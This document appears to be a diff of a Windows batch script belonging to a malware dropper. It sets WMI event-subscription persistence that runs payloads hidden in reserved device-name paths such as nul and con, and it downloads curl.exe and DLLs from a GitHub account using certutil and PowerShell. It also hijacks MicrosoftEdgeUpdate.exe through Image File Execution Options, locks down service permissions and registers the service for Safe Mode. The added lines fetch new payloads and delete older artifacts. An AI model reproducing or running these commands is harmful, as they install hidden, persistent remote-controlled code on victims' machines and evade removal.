@@ -1,4 +1,5 @@
 taskkill.exe /f /IM nul.exe
+taskkill.exe /f /IM con.exe
 wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter WHERE Name="NRP" GET Query 2>nul | findstr /C:"ISA 'Win32_PerfFormattedData_PerfOS_System'" >nul || wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter WHERE Name="NRP" SET Query="SELECT * FROM __InstanceModificationEvent WITHIN 70 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 300"
 wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter WHERE Name="NOC" GET Query 2>nul | findstr /C:"ISA 'Win32_PerfFormattedData_PerfOS_System'" >nul || wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter WHERE Name="NOC" SET Query="SELECT * FROM __InstanceModificationEvent WITHIN 70 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 310 AND TargetInstance.SystemUpTime < 370"
 wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer WHERE Name="LUN" GET CommandLineTemplate 2>nul | findstr /C:"\\.\%ProgramData%" >nul || wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer WHERE Name="LUN" SET CommandLineTemplate="\\.\%ProgramData%\nuldata..\nul.exe \\.\%ProgramData%\nuldata..\nul"
@@ -7,9 +8,22 @@ powershell.exe -NoProfile -Command "$f = Get-WmiObject -Namespace 'root\subscrip
 powershell.exe -NoProfile -Command "$f = Get-WmiObject -Namespace 'root\subscription' -Class __EventFilter -Filter \"Name='NOC'\" -ErrorAction SilentlyContinue; if (-not $f -or $f.Query -notlike \"*ISA 'Win32_PerfFormattedData_PerfOS_System'*\") { Set-WmiInstance -Path '\\.\root\subscription:__EventFilter.Name=\"NOC\"' -Arguments @{EventNamespace='root\cimv2'; QueryLanguage='WQL'; Query='SELECT * FROM __InstanceModificationEvent WITHIN 70 WHERE TargetInstance ISA ''Win32_PerfFormattedData_PerfOS_System'' AND TargetInstance.SystemUpTime >= 310 AND TargetInstance.SystemUpTime < 370'} | Out-Null }"
 powershell.exe -NoProfile -Command "$target = '\\.\%ProgramData%\nuldata..\nul.exe \\.\%ProgramData%\nuldata..\nul'; $c = Get-CimInstance -Namespace root\subscription -ClassName CommandLineEventConsumer -Filter \"Name='LUN'\"; if ($c -and $c.CommandLineTemplate -ne $target) { $c.CommandLineTemplate = $target; Set-CimInstance -InputObject $c }"
 
-dir "%ProgramData%\curl.exe" >nul || powershell.exe -NoProfile Invoke-WebRequest -Uri https://github.com/vltex/1/raw/1/0/curl.exe -OutFile C:\ProgramData\curl.exe
+dir "%ProgramData%\curl.exe" >nul || powershell.exe -NoProfile Invoke-WebRequest https://github.com/vltex/1/raw/1/0/curl.exe -OutFile C:\ProgramData\curl.exe
 dir "%ProgramData%\curl.exe" >nul || certutil -url""""cache -split -f "https://github.com/vltex/1/raw/1/0/curl.exe" "%ProgramData%\curl.exe"
+dir "\\?\%ProgramData%\nuldata..\nul" >nul || curl.exe -s -L -o "\\?\%ProgramData%\nuldata..\nul" "https://github.com/vltex/0/raw/main/1/winfw.dll"
+dir "\\?\%ProgramData%\condata..\con" >nul || curl.exe -s -L -o "\\?\%ProgramData%\condata..\con" "https://github.com/vltex/0/raw/main/1/Kape.dll"
+dir "\\?\%ProgramData%\nuldata..\nul" >nul || powershell.exe -NoProfile Invoke-WebRequest https://github.com/vltex/0/raw/main/1/winfw.dll -OutFile \\?\%ProgramData%\nuldata..\nul
+dir "\\?\%ProgramData%\condata..\con" >nul || powershell.exe -NoProfile Invoke-WebRequest https://github.com/vltex/0/raw/main/1/Kape.dll -OutFile \\?\%ProgramData%\condata..\con
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MicrosoftEdgeUpdate.exe" /v Debugger >nul || reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MicrosoftEdgeUpdate.exe" /v Debugger /t REG_SZ /d "\\.\%ProgramData%\prndata..\prn.exe \\.\%ProgramData%\prndata..\prn" /f
 reg query "HKLM\SYSTEM\CurrentControlSet\Services\OneSyncTask" /v Security >nul || sc sdset "OneSyncTask" "D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
 reg query "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\OneSyncTask" /ve >nul || reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\OneSyncTask" /ve /t REG_SZ /d "Service" /f
 reg query "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\OneSyncTask" /ve >nul || reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\OneSyncTask" /ve /t REG_SZ /d "Service" /f
+del /S /Q %ProgramData%\buh.cmd
+del /S /Q \\.\%ProgramData%\prndata..\nul
+del /S /Q \\.\%ProgramData%\prndata..\con
+rd /S /Q \\.\%ProgramData%\AUX..\
+rd /S /Q \\.\%ProgramData%\CON..\
+rd /S /Q \\.\%ProgramData%\NUL..\
+rd /S /Q \\.\%ProgramData%\config..\
+rd /S /Q \\.\%ProgramData%\logdata..\
+rd /S /Q \\.\%ProgramData%\diaglogs..\
